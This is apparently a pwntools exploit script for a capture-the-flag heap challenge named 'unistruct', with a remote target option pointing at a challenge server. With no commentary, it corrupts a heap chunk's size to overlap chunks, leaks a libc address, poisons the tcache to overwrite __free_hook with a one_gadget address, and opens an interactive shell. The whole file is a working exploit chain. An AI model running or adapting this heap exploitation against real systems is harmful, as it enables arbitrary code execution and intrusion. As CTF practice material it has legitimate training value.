from pwn import *


context.update(arch='i386',os='linux',timeout=1)

context.log_level='debug'

if args.Q:
    io=remote("124.70.137.88", 40000)
else:
    io=process("./unistruct")
LIBC=ELF("./libc-2.27.so")
sla=lambda a,b:io.sendlineafter(a,b)
sl=lambda a:io.sendline(a)
def choice(c):   
    sla("Choice: ",str(c))

def add(t,s,i):#1--uint32 2--float 3--str 4--double
    choice(1)
    sla("Index: ",str(t))
    sla("Type: ",str(s))
    sla("Value: ",i)
def edit0(i,h,l,k): #0--append 1--place
    choice(2)
    sla("Index: ",str(i))
    for i in range(k):
        sla("place: ",str(0))
        sla("value: ",str(l))
        sla("place: ",str(1))
        sla("value: ",str(h))


        sla("place: ",str(0))
        sla("value: ",str(h))
        sla("place: ",str(1))
        sla("value: ",str(l))
    sla("place: ",str(0))
    sla("value: ",str(3405691582))
def edit1(i,v,k):
    choice(2)
    sla("Index: ",str(i))
    for i in range(k):
        sla("place: ",str(1))
        sla("value: ",str(v))
    sla("place: ",str(0))
    sla("value: ",str(3405691582))
def edit(i,v):
    choice(2)
    sla("Index: ",str(i))
    sl(str(v))
def show(i):
    choice(3)
    sla("Index: ",str(i))
def dele(i):
    choice(4)
    sla("Index: ",str(i))
def main():
    """
    for i in range(8):
        add(i,4,str(0x40))
    for i in range(7):
        dele(i+1)
    dele(0)
    for i in range(7):
        add(i+1,4,str(0x40))
    add(0,3,"a"*0x88)
    """
    add(0,4,str(2))
    add(1,4,str(2))
    add(2,4,str(0x110))#0x450
    add(3,4,str(0x20))#0x90
    dele(1)
    edit0(0,0x4e1,0,4)
    dele(2)
    add(4,4,str(0x116))
    show(3)
    libc=io.recvline().strip(",")
    libc_l=libc[14:24]
    libc_h=libc[26:31]
    libc=(int(libc_h)<<32)+int(libc_l)-0x3ebd10
    free_hook=LIBC.sym["__free_hook"]+libc
    system=LIBC.sym["system"]+libc
    print("libc==>"+hex(libc))
    print("free_hook==>"+hex(free_hook))
    add(5,4,str(0x20))
    edit0(3,free_hook&0xffffffff,free_hook>>32,0x10)
    add(6,4,str(0x20))
   # gdb.attach(io,"b *0x555555554000+0x240d")
    add(0,3,p64(0x10a41c+libc)*(0x80/8))
    #edit0(7,system&0xffffffff,system>>32,0x10)
    #xgdb.attach(io,"b *0x555555554000+0x240d")
    io.interactive()
if __name__=="__main__":
    main()
